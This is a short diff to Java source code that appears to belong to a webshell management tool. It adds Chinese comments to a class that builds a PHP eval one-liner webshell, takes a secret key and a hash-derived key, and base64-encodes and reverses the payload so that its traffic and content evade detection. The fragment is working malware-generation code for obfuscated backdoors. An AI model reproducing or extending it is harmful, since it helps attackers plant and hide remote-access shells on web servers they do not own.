@@ -7,7 +7,9 @@ import java.net.URLEncoder;
 import util.Log;
 import util.functions;
 import util.http.Http;
-
+/*
+默认生成裸的eval php一句话,只是流量采用xor+base64混淆
+ */
 @CryptionAnnotation(
    Name = "PHP_EVAL_XOR_BASE64",
    payloadName = "PhpDynamicPayload"
@@ -104,6 +106,8 @@ public class PhpEvalXor implements Cryption {
    }
 
    public String generateEvalContent() {
+      //拿到base64.bin的php代码作为模板嵌入eval
+      //secretKey 作为密码,secretKey前16位的hash值作为key再注入一段eval
       String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false))).replace("<?php", "");
       eval = functions.base64EncodeToString(eval.getBytes());
       eval = (new StringBuffer(eval)).reverse().toString();
